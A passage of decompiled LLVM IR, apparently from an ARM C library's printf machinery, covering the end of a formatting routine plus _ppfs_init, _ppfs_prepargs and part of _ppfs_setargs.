  br i1 %v9_13b60, label %dec_label_pc_13b68, label %dec_label_pc_13c28

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b40
  %v3_13b68 = load i32, i32* %stack_var_-44, align 4
  %v2_13b6c = icmp eq i32 %v3_13b68, 0
  br i1 %v2_13b6c, label %dec_label_pc_13b74, label %dec_label_pc_13b98

dec_label_pc_13b74:                               ; preds = %dec_label_pc_13b68
  %v0_13b74 = load i32, i32* @r5, align 4
  %v2_13b74 = icmp eq i32 %v0_13b74, 0
  br i1 %v2_13b74, label %dec_label_pc_13bfc, label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %dec_label_pc_13b74
  %v0_13b7c = load i32, i32* @r4, align 4
  store i32 %v0_13b7c, i32* %r0.global-to-local, align 4
  %v0_13b84 = load i32, i32* @fp, align 4
  store i32 %v0_13b84, i32* %r2.global-to-local, align 4
  %v3_13b88 = inttoptr i32 %v0_13b84 to i16*
  %v4_13b88 = call i32 @__stdio_fwrite(i32 %v0_13b7c, i32 %v0_13b74, i16* %v3_13b88)
  store i32 %v4_13b88, i32* %r0.global-to-local, align 4
  %v1_13b8c = load i32, i32* @r5, align 4
  %v9_13b8c = icmp eq i32 %v4_13b88, %v1_13b8c
  br i1 %v9_13b8c, label %dec_label_pc_13bfc, label %dec_label_pc_13c28

dec_label_pc_13b98:                               ; preds = %dec_label_pc_13b68
  store i32 %v2_13a3c, i32* @r6, align 4
  store i32 %v2_13938, i32* @r8, align 4
  store i32 %v2_13944, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_13be8.pr = load i32, i32* @r5, align 4
  %v2_13be841 = icmp eq i32 %v0_13be8.pr, 0
  store i32 %v2_13938, i32* @r1, align 4
  store i32 %v2_13a3c, i32* @r0, align 4
  br i1 %v2_13be841, label %dec_label_pc_13bfc, label %dec_label_pc_13bb0

dec_label_pc_13bb0:                               ; preds = %dec_label_pc_13b98, %dec_label_pc_13be4
  %v1_13bb4 = phi i32 [ %v2_13be4, %dec_label_pc_13be4 ], [ %v0_13be8.pr, %dec_label_pc_13b98 ]
  %v2_13bb0 = icmp ult i32 %v1_13bb4, 128
  %.v1_13bb4 = select i1 %v2_13bb0, i32 %v1_13bb4, i32 128
  store i32 %.v1_13bb4, i32* %r2.global-to-local, align 4
  %v6_13bbc = call i32 @__GI_wcsrtombs(i32 %v2_13a3c, i32 %v2_13938, i32 %.v1_13bb4, i32 %v2_13944, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_13bbc, i32* @r4, align 4
  %v2_13bc0 = icmp eq i32 %v6_13bbc, 0
  store i32 %v6_13bbc, i32* %r0.global-to-local, align 4
  br i1 %v2_13bc0, label %dec_label_pc_13be4, label %dec_label_pc_13bcc

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13bb0
  store i32 %v2_13a3c, i32* %r0.global-to-local, align 4
  %v0_13bd4 = load i32, i32* @fp, align 4
  store i32 %v0_13bd4, i32* %r2.global-to-local, align 4
  %v3_13bd8 = inttoptr i32 %v0_13bd4 to i16*
  %v4_13bd8 = call i32 @__stdio_fwrite(i32 %v2_13a3c, i32 %v6_13bbc, i16* %v3_13bd8)
  store i32 %v4_13bd8, i32* %r0.global-to-local, align 4
  %v1_13bdc = load i32, i32* @r4, align 4
  %v9_13bdc = icmp eq i32 %v4_13bd8, %v1_13bdc
  br i1 %v9_13bdc, label %dec_label_pc_13be4, label %dec_label_pc_13c28

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bcc, %dec_label_pc_13bb0
  %v0_13be4 = phi i32 [ %v4_13bd8, %dec_label_pc_13bcc ], [ 0, %dec_label_pc_13bb0 ]
  %v1_13be4 = load i32, i32* @r5, align 4
  %v2_13be4 = sub i32 %v1_13be4, %v0_13be4
  store i32 %v2_13be4, i32* @r5, align 4
  %v2_13be8 = icmp eq i32 %v2_13be4, 0
  store i32 %v2_13938, i32* @r1, align 4
  store i32 %v2_13a3c, i32* @r0, align 4
  br i1 %v2_13be8, label %dec_label_pc_13bfc, label %dec_label_pc_13bb0

dec_label_pc_13bfc:                               ; preds = %dec_label_pc_13be4, %dec_label_pc_13b98, %dec_label_pc_13b7c, %dec_label_pc_13b74
  %v0_13bfc = load i32, i32* @fp, align 4
  store i32 %v0_13bfc, i32* %r0.global-to-local, align 4
  %v0_13c04 = load i32, i32* @sl, align 4
  store i32 %v0_13c04, i32* %r2.global-to-local, align 4
  %v4_13c08 = call i32 @_charpad(i32 %v0_13bfc, i8 32, i32 %v0_13c04)
  store i32 %v4_13c08, i32* %r0.global-to-local, align 4
  %v1_13c0c = load i32, i32* @sl, align 4
  %v9_13c0c = icmp eq i32 %v4_13c08, %v1_13c0c
  br i1 %v9_13c0c, label %dec_label_pc_13c14, label %dec_label_pc_13c28

dec_label_pc_13c14:                               ; preds = %dec_label_pc_13bfc, %dec_label_pc_13aa0, %dec_label_pc_138fc, %dec_label_pc_1370c
  %stack_var_-336.4 = phi i32 [ %v0_13768, %dec_label_pc_1370c ], [ %v0_13b1c, %dec_label_pc_13bfc ], [ %v0_13768, %dec_label_pc_13aa0 ], [ %v0_13768, %dec_label_pc_138fc ]
  %stack_var_-356.3 = phi i32 [ %v1_13b00, %dec_label_pc_1370c ], [ %v2_13b04, %dec_label_pc_13bfc ], [ %v2_13aa4, %dec_label_pc_13aa0 ], [ %v2_13900, %dec_label_pc_138fc ]
  %v3_13c14 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_13c14, i32* @r4, align 4
  store i32 %v3_13c14, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13634.outer

dec_label_pc_13c20:                               ; preds = %dec_label_pc_13690
  %v1_13c20 = add i32 %v0_13698, 2
  store i32 %v1_13c20, i32* @r4, align 4
  br label %dec_label_pc_13634.outer36

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13ab0, %dec_label_pc_13934, %dec_label_pc_13bfc, %dec_label_pc_13b7c, %dec_label_pc_13b40, %dec_label_pc_13b24, %dec_label_pc_13a78, %dec_label_pc_1395c, %dec_label_pc_138d4, %bb142, %dec_label_pc_13bcc
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_13c30

dec_label_pc_13c30:                               ; preds = %dec_label_pc_13684, %bb, %dec_label_pc_135c8, %dec_label_pc_13c28
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_135c8 ], [ -1, %dec_label_pc_13c28 ], [ %v1_13b00, %dec_label_pc_13684 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_13578, i32* @r5, align 4
  store i32 %v12_13578, i32* %r7.global-to-local, align 4
  store i32 %v18_13578, i32* @sb, align 4
  store i32 %v21_13578, i32* @sl, align 4
  store i32 %v24_13578, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_13c20, { 1, 0 }
  uselistorder i32 %v3_13c14, { 1, 2, 0 }
  uselistorder i32 %v2_13be4, { 1, 2, 0 }
  uselistorder i32 %v0_13b2c, { 1, 0 }
  uselistorder i32 %v2_13b14, { 2, 0, 1 }
  uselistorder i1 %v9_13af0, { 1, 0 }
  uselistorder i32 %v2_13ad4, { 1, 0 }
  uselistorder i32 %v0_13b1c, { 1, 0 }
  uselistorder i32 %v0_13ad4, { 1, 0 }
  uselistorder i32 %v1_13ab0, { 1, 0 }
  uselistorder i32 %v1_13a78, { 1, 0, 2 }
  uselistorder i32 %v3_13a48, { 1, 2, 0 }
  uselistorder i32 %v0_139b4, { 1, 0 }
  uselistorder i32 %v2_139a4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_1396c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_138e4, { 1, 0 }
  uselistorder i32 %v2_13844, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_13860, { 1, 2, 3, 0 }
  uselistorder i32 %v2_137e0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_13748, { 0, 2, 1, 3 }
  uselistorder i32 %v1_136ec.pre, { 1, 0, 2 }
  uselistorder i32 %v1_136e4, { 1, 0 }
  uselistorder i32 %v1_13690, { 0, 1, 3, 2 }
  uselistorder i32 %v1_13b00, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_13650, { 1, 0 }
  uselistorder i32 %v1_13648.lcssa, { 1, 0 }
  uselistorder i8 %v2_13634, { 1, 0 }
  uselistorder i32 %v2_13648, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_13660, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13768, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_13858, { 1, 0 }
  uselistorder i1 %v7_137a8, { 1, 2, 0 }
  uselistorder i1 %v7_13994, { 1, 0 }
  uselistorder i1 %v7_1390c, { 1, 0 }
  uselistorder i1 %v7_137e8, { 1, 0 }
  uselistorder i32 %v2_13944, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_13938, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_13a3c, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_136e8, { 1, 3, 2, 0 }
  uselistorder i32 %v4_136c4, { 1, 0 }
  uselistorder i32 %v2_13580, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 30, 31, 25, 26, 27, 28, 29, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 8, 6, 7, 10, 9, 11, 13, 12, 18, 14, 15, 16, 17, 19, 20, 23, 21, 22, 25, 24, 27, 26, 29, 28, 31, 30, 34, 32, 33, 37, 38, 35, 36, 39, 40, 1, 2, 42, 41, 44, 43, 46, 45, 48, 47, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -89992), { 1, 0 }
  uselistorder label %dec_label_pc_13c30, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13c28, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_13bb0, { 1, 0 }
  uselistorder label %dec_label_pc_13b40, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_13aec, { 1, 0 }
  uselistorder label %dec_label_pc_13ad0, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_13ad0thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_139f8, { 1, 0 }
  uselistorder label %dec_label_pc_139b0, { 1, 0 }
  uselistorder label %dec_label_pc_138c4, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_13798, { 1, 0 }
  uselistorder label %dec_label_pc_13794, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_136e0, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_13684, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_13650, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_13634.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13c60 = load i32, i32* @r4, align 4
  %v6_13c60 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_13c6c = load i32, i32* @r1, align 4
  store i32 %v0_13c6c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_13c78 = bitcast i32* %arg1 to i8*
  %v3_13c78 = call i32 @__GI_memset(i8* %v2_13c78, i32 0)
  store i32 %v3_13c78, i32* %r0.global-to-local, align 4
  %v0_13c7c = load i32, i32* @r4, align 4
  %v1_13c7c = add i32 %v0_13c7c, 24
  %v2_13c7c = inttoptr i32 %v1_13c7c to i32*
  %v3_13c7c = load i32, i32* %v2_13c7c, align 4
  store i32 %v3_13c7c, i32* %r3.global-to-local, align 4
  %v0_13c80 = load i32, i32* @r5, align 4
  %v2_13c80 = inttoptr i32 %v0_13c7c to i32*
  store i32 %v0_13c80, i32* %v2_13c80, align 4
  %v0_13c84 = load i32, i32* %r3.global-to-local, align 4
  %v1_13c84 = add i32 %v0_13c84, -1
  %v1_13c88 = load i32, i32* @r4, align 4
  %v2_13c88 = add i32 %v1_13c88, 24
  %v3_13c88 = inttoptr i32 %v2_13c88 to i32*
  store i32 %v1_13c84, i32* %v3_13c88, align 4
  %v0_13c8c = load i32, i32* @r4, align 4
  %v1_13c8c = add i32 %v0_13c8c, 40
  store i32 %v1_13c8c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_13c9c21 = inttoptr i32 %v1_13c8c to i32*
  store i32 8, i32* %v2_13c9c21, align 4
  %v3_13c9c22 = load i32, i32* %r2.global-to-local, align 4
  %v4_13c9c23 = add i32 %v3_13c9c22, 4
  store i32 %v4_13c9c23, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c98.dec_label_pc_13c98_crit_edge

dec_label_pc_13c98.dec_label_pc_13c98_crit_edge:  ; preds = %entry, %dec_label_pc_13c98.dec_label_pc_13c98_crit_edge
  %v4_13c9c24 = phi i32 [ %v4_13c9c23, %entry ], [ %v4_13c9c, %dec_label_pc_13c98.dec_label_pc_13c98_crit_edge ]
  %v0_13c98.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_13c9c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13c98 = add i32 %v0_13c98.pre, -1
  store i32 %v1_13c98, i32* %r3.global-to-local, align 4
  %v7_13c98 = icmp eq i32 %v0_13c98.pre, 1
  %v2_13c9c = inttoptr i32 %v4_13c9c24 to i32*
  store i32 %v0_13c9c.pre, i32* %v2_13c9c, align 4
  %v3_13c9c = load i32, i32* %r2.global-to-local, align 4
  %v4_13c9c = add i32 %v3_13c9c, 4
  store i32 %v4_13c9c, i32* %r2.global-to-local, align 4
  br i1 %v7_13c98, label %dec_label_pc_13ca4, label %dec_label_pc_13c98.dec_label_pc_13c98_crit_edge

dec_label_pc_13ca4:                               ; preds = %dec_label_pc_13c98.dec_label_pc_13c98_crit_edge
  %v0_13ca4 = load i32, i32* @r5, align 4
  store i32 %v0_13ca4, i32* %r2.global-to-local, align 4
  %v1_13ce42 = inttoptr i32 %v0_13ca4 to i8*
  %v2_13ce43 = load i8, i8* %v1_13ce42, align 1
  %v3_13ce44 = zext i8 %v2_13ce43 to i32
  store i32 %v3_13ce44, i32* %r0.global-to-local, align 4
  %v2_13ce85 = icmp eq i8 %v2_13ce43, 0
  br i1 %v2_13ce85, label %dec_label_pc_13cf0, label %dec_label_pc_13cac

dec_label_pc_13cac:                               ; preds = %dec_label_pc_13ca4, %dec_label_pc_13ce4.backedge
  %v0_13cb4 = phi i32 [ %storemerge, %dec_label_pc_13ce4.backedge ], [ %v0_13ca4, %dec_label_pc_13ca4 ]
  %v0_13cac = phi i32 [ %v3_13ce4, %dec_label_pc_13ce4.backedge ], [ %v3_13ce44, %dec_label_pc_13ca4 ]
  %v7_13cac = icmp eq i32 %v0_13cac, 37
  br i1 %v7_13cac, label %dec_label_pc_13cb4, label %dec_label_pc_13ce0

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13cac
  %v1_13cb4 = add i32 %v0_13cb4, 1
  %v2_13cb4 = inttoptr i32 %v1_13cb4 to i8*
  %v3_13cb4 = load i8, i8* %v2_13cb4, align 1
  %v4_13cb4 = zext i8 %v3_13cb4 to i32
  store i32 %v4_13cb4, i32* %r3.global-to-local, align 4
  store i32 %v1_13cb4, i32* %r2.global-to-local, align 4
  %v7_13cb8 = icmp eq i8 %v3_13cb4, 37
  br i1 %v7_13cb8, label %dec_label_pc_13ce0, label %dec_label_pc_13cc0

dec_label_pc_13cc0:                               ; preds = %dec_label_pc_13cb4
  %v1_13cc0 = load i32, i32* @r4, align 4
  %v2_13cc0 = inttoptr i32 %v1_13cc0 to i32*
  store i32 %v1_13cb4, i32* %v2_13cc0, align 4
  %v0_13cc4 = load i32, i32* @r4, align 4
  store i32 %v0_13cc4, i32* %r0.global-to-local, align 4
  %v1_13cc8 = inttoptr i32 %v0_13cc4 to i8*
  %v2_13cc8 = call i32 @_ppfs_parsespec(i8* %v1_13cc8)
  store i32 %v2_13cc8, i32* %r0.global-to-local, align 4
  %v1_13ccc = icmp slt i32 %v2_13cc8, 0
  br i1 %v1_13ccc, label %dec_label_pc_13cf4.loopexit, label %dec_label_pc_13cd8

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13cc0
  %v0_13cd8 = load i32, i32* @r4, align 4
  %v1_13cd8 = inttoptr i32 %v0_13cd8 to i32*
  %v2_13cd8 = load i32, i32* %v1_13cd8, align 4
  br label %dec_label_pc_13ce4.backedge

dec_label_pc_13ce0:                               ; preds = %dec_label_pc_13cac, %dec_label_pc_13cb4
  %v0_13ce0 = phi i32 [ %v0_13cb4, %dec_label_pc_13cac ], [ %v1_13cb4, %dec_label_pc_13cb4 ]
  %v1_13ce0 = add i32 %v0_13ce0, 1
  br label %dec_label_pc_13ce4.backedge

dec_label_pc_13ce4.backedge:                      ; preds = %dec_label_pc_13ce0, %dec_label_pc_13cd8
  %storemerge = phi i32 [ %v1_13ce0, %dec_label_pc_13ce0 ], [ %v2_13cd8, %dec_label_pc_13cd8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_13ce4 = inttoptr i32 %storemerge to i8*
  %v2_13ce4 = load i8, i8* %v1_13ce4, align 1
  %v3_13ce4 = zext i8 %v2_13ce4 to i32
  store i32 %v3_13ce4, i32* %r0.global-to-local, align 4
  %v2_13ce8 = icmp eq i8 %v2_13ce4, 0
  br i1 %v2_13ce8, label %dec_label_pc_13ce4.dec_label_pc_13cf0_crit_edge, label %dec_label_pc_13cac

dec_label_pc_13ce4.dec_label_pc_13cf0_crit_edge:  ; preds = %dec_label_pc_13ce4.backedge
  %v0_13cf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13cf0

dec_label_pc_13cf0:                               ; preds = %dec_label_pc_13ce4.dec_label_pc_13cf0_crit_edge, %dec_label_pc_13ca4
  %v0_13cf0 = phi i32 [ %v0_13cf0.pre, %dec_label_pc_13ce4.dec_label_pc_13cf0_crit_edge ], [ %v0_13ca4, %dec_label_pc_13ca4 ]
  %v1_13cf0 = load i32, i32* @r4, align 4
  %v2_13cf0 = inttoptr i32 %v1_13cf0 to i32*
  store i32 %v0_13cf0, i32* %v2_13cf0, align 4
  %v1_13cfc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13cf4

dec_label_pc_13cf4.loopexit:                      ; preds = %dec_label_pc_13cc0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13cf4

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cf4.loopexit, %dec_label_pc_13cf0
  %v1_13cfc = phi i32 [ -1, %dec_label_pc_13cf4.loopexit ], [ %v1_13cfc.pre, %dec_label_pc_13cf0 ]
  store i32 %v3_13c60, i32* @r4, align 4
  store i32 %v6_13c60, i32* @r5, align 4
  ret i32 %v1_13cfc

; uselistorder directives
  uselistorder i32 %v3_13ce4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_13ca4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c9c, { 1, 0 }
  uselistorder i32 %v0_13c98.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder label %dec_label_pc_13ce0, { 1, 0 }
  uselistorder label %dec_label_pc_13cac, { 1, 0 }
  uselistorder label %dec_label_pc_13c98.dec_label_pc_13c98_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13d00 = load i32, i32* @r4, align 4
  store i32 %v3_13d00, i32* %stack_var_-12, align 4
  %v0_13d04 = load i32, i32* @r0, align 4
  %v1_13d04 = add i32 %v0_13d04, 24
  %v2_13d04 = inttoptr i32 %v1_13d04 to i32*
  %v3_13d04 = load i32, i32* %v2_13d04, align 4
  store i32 %v3_13d04, i32* %r5.global-to-local, align 4
  store i32 %v0_13d04, i32* @r4, align 4
  %v2_13d14 = add i32 %v0_13d04, 76
  %v3_13d14 = inttoptr i32 %v2_13d14 to i32*
  store i32 %arg2, i32* %v3_13d14, align 4
  %tmp5 = icmp slt i32 %v3_13d04, 1
  br i1 %tmp5, label %dec_label_pc_13d38, label %dec_label_pc_13d1c

dec_label_pc_13d1c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13d20 = load i32, i32* @r0, align 4
  %v2_13d20 = add i32 %v1_13d20, 8
  %v3_13d20 = inttoptr i32 %v2_13d20 to i32*
  store i32 0, i32* %v3_13d20, align 4
  %v0_13d24 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d24 = load i32, i32* @r0, align 4
  %v2_13d24 = add i32 %v1_13d24, 28
  %v3_13d24 = inttoptr i32 %v2_13d24 to i32*
  store i32 %v0_13d24, i32* %v3_13d24, align 4
  %v0_13d28 = load i32, i32* %r3.global-to-local, align 4
  %v1_13d28 = load i32, i32* @r0, align 4
  %v2_13d28 = add i32 %v1_13d28, 24
  %v3_13d28 = inttoptr i32 %v2_13d28 to i32*
  store i32 %v0_13d28, i32* %v3_13d28, align 4
  %v0_13d2c = load i32, i32* %r3.global-to-local, align 4
  %v1_13d2c = load i32, i32* @r0, align 4
  %v2_13d2c = add i32 %v1_13d2c, 4
  %v3_13d2c = inttoptr i32 %v2_13d2c to i32*
  store i32 %v0_13d2c, i32* %v3_13d2c, align 4
  %v0_13d30 = call i32 @_ppfs_setargs()
  store i32 %v0_13d30, i32* @r0, align 4
  %v0_13d34 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d34 = load i32, i32* @r4, align 4
  %v2_13d34 = add i32 %v1_13d34, 24
  %v3_13d34 = inttoptr i32 %v2_13d34 to i32*
  store i32 %v0_13d34, i32* %v3_13d34, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %entry, %dec_label_pc_13d1c
  %v2_13d3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13d3c, i32* @r4, align 4
  %v1_13d40 = load i32, i32* @r0, align 4
  ret i32 %v1_13d40

; uselistorder directives
  uselistorder i32 %v0_13d04, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_13d38, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_13d44 = load i32, i32* @r0, align 4
  %v1_13d44 = add i32 %v0_13d44, 24
  %v2_13d44 = inttoptr i32 %v1_13d44 to i32*
  %v3_13d44 = load i32, i32* %v2_13d44, align 4
  store i32 %v3_13d44, i32* %r1.global-to-local, align 4
  %v2_13d48 = icmp eq i32 %v3_13d44, 0
  %v3_13d4c = load i32, i32* @r4, align 4
  store i32 %v3_13d4c, i32* %stack_var_-8, align 4
  %v1_13d50 = add i32 %v0_13d44, 8
  %v2_13d50 = inttoptr i32 %v1_13d50 to i32*
  %v3_13d50 = load i32, i32* %v2_13d50, align 4
  store i32 %v3_13d50, i32* %r3.global-to-local, align 4
  %v6_13d58 = icmp eq i32 %v3_13d50, -2147483648
  br i1 %v2_13d48, label %dec_label_pc_13d58, label %dec_label_pc_13e90

dec_label_pc_13d58:                               ; preds = %entry
  br i1 %v6_13d58, label %dec_label_pc_13d60, label %dec_label_pc_13d78

dec_label_pc_13d60:                               ; preds = %dec_label_pc_13d58
  %v1_13d60 = add i32 %v0_13d44, 76
  %v2_13d60 = inttoptr i32 %v1_13d60 to i32*
  %v3_13d60 = load i32, i32* %v2_13d60, align 4
  store i32 %v3_13d60, i32* %r3.global-to-local, align 4
  %v1_13d64 = inttoptr i32 %v3_13d60 to i32*
  %v2_13d64 = load i32, i32* %v1_13d64, align 4
  store i32 %v2_13d64, i32* %r2.global-to-local, align 4
  %v1_13d68 = add i32 %v3_13d60, 4
  store i32 %v1_13d68, i32* %r3.global-to-local, align 4
  store i32 %v1_13d68, i32* %v2_13d60, align 4
  %v0_13d70 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d70 = load i32, i32* @r0, align 4
  %v2_13d70 = add i32 %v1_13d70, 8
  %v3_13d70 = inttoptr i32 %v2_13d70 to i32*
  store i32 %v0_13d70, i32* %v3_13d70, align 4
  %v0_13d74 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d74 = load i32, i32* @r0, align 4
  %v2_13d74 = add i32 %v1_13d74, 80
  %v3_13d74 = inttoptr i32 %v2_13d74 to i32*
  store i32 %v0_13d74, i32* %v3_13d74, align 4
  %v0_13d78.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13d78

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d58, %dec_label_pc_13d60
  %v1_13d94 = phi i32 [ %v0_13d44, %dec_label_pc_13d58 ], [ %v0_13d78.pre, %dec_label_pc_13d60 ]
  %v1_13d78 = add i32 %v1_13d94, 4
  %v2_13d78 = inttoptr i32 %v1_13d78 to i32*
  %v3_13d78 = load i32, i32* %v2_13d78, align 4
  store i32 %v3_13d78, i32* %r3.global-to-local, align 4
  %v6_13d7c = icmp eq i32 %v3_13d78, -2147483648
  %v1_13d80 = add i32 %v1_13d94, 80
  store i32 %v1_13d80, i32* %ip.global-to-local, align 4
  br i1 %v6_13d7c, label %dec_label_pc_13d88, label %dec_label_pc_13da0

dec_label_pc_13d88:                               ; preds = %dec_label_pc_13d78
  %v1_13d88 = add i32 %v1_13d94, 76
  %v2_13d88 = inttoptr i32 %v1_13d88 to i32*
  %v3_13d88 = load i32, i32* %v2_13d88, align 4
  store i32 %v3_13d88, i32* %r3.global-to-local, align 4
  %v1_13d8c = inttoptr i32 %v3_13d88 to i32*
  %v2_13d8c = load i32, i32* %v1_13d8c, align 4
  store i32 %v2_13d8c, i32* %r2.global-to-local, align 4
  %v1_13d90 = add i32 %v3_13d88, 4
  store i32 %v1_13d90, i32* %r3.global-to-local, align 4
  store i32 %v1_13d90, i32* %v2_13d88, align 4
  %v0_13d98 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d98 = load i32, i32* @r0, align 4
  %v2_13d98 = add i32 %v1_13d98, 4
  %v3_13d98 = inttoptr i32 %v2_13d98 to i32*
  store i32 %v0_13d98, i32* %v3_13d98, align 4
  %v0_13d9c = load i32, i32* %r2.global-to-local, align 4
  %v1_13d9c = load i32, i32* @r0, align 4
  %v2_13d9c = add i32 %v1_13d9c, 80
  %v3_13d9c = inttoptr i32 %v2_13d9c to i32*
  store i32 %v0_13d9c, i32* %v3_13d9c, align 4
  %v0_13e8017.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d78, %dec_label_pc_13d88
  %v0_13e8017 = phi i32 [ %v1_13d94, %dec_label_pc_13d78 ], [ %v0_13e8017.pre, %dec_label_pc_13d88 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_13da4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13da4, i32* %lr.global-to-local, align 4
  %v1_13e8018 = add i32 %v0_13e8017, 28
  %v2_13e8019 = inttoptr i32 %v1_13e8018 to i32*
  %v3_13e8020 = load i32, i32* %v2_13e8019, align 4
